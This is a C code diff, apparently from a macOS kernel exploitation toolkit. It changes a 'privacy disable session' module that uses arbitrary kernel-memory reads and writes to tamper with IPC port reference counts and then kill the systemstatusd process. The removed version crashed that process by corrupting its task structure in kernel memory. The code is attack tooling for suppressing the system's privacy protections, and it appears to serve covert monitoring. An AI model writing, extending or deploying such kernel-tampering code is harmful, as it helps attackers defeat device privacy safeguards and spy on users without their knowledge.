@@ -8,12 +8,15 @@
 #include <stdlib.h>
 #include <limits.h>
 #include <libproc.h>
+#include <signal.h>
 
 #include <xe/memory/kmem.h>
 #include <xe/xnu/proc.h>
 #include <xe/xnu/ipc.h>
 #include <xe/util/assert.h>
 #include <xe/util/log.h>
+#include <xe/util/sudo.h>
+#include <xe/util/misc.h>
 
 #include "privacy.h"
 
@@ -101,9 +104,14 @@ privacy_disable_session_t privacy_disable_session_start(void) {
 }
 
 
-void crash_process(uintptr_t proc) {
-    uintptr_t task = xe_kmem_read_ptr(proc, TYPE_PROC_MEM_TASK_OFFSET);
-    xe_kmem_write_uint64(task, TYPE_TASK_MEM_ROP_PID_OFFSET, 0);
+void privacy_disable_session_kill_process(uintptr_t proc) {
+    uint32_t pid = xe_kmem_read_uint32(proc, TYPE_PROC_MEM_P_PID_OFFSET);
+    char kill_cmd[NAME_MAX];
+    snprintf(kill_cmd, sizeof(kill_cmd), "kill -9 %d", pid);
+    int error = kill(pid, SIGKILL);
+    if (error) {
+        xe_log_warn("failed to kill systemstatusd, err: %s", strerror(errno));
+    }
 }
 
 
@@ -120,7 +128,7 @@ void privacy_disable_session_stop(privacy_disable_session_t* session_p) {
         xe_kmem_write_uint32(port, TYPE_IPC_PORT_MEM_IP_OBJECT_OFFSET + TYPE_IPC_OBJECT_MEM_IO_REFERENCES_OFFSET, ref_cnt);
     }
     
-    crash_process(session->systemstatusd);
+    privacy_disable_session_kill_process(session->systemstatusd);
     
     free(session);
     *session_p = NULL;
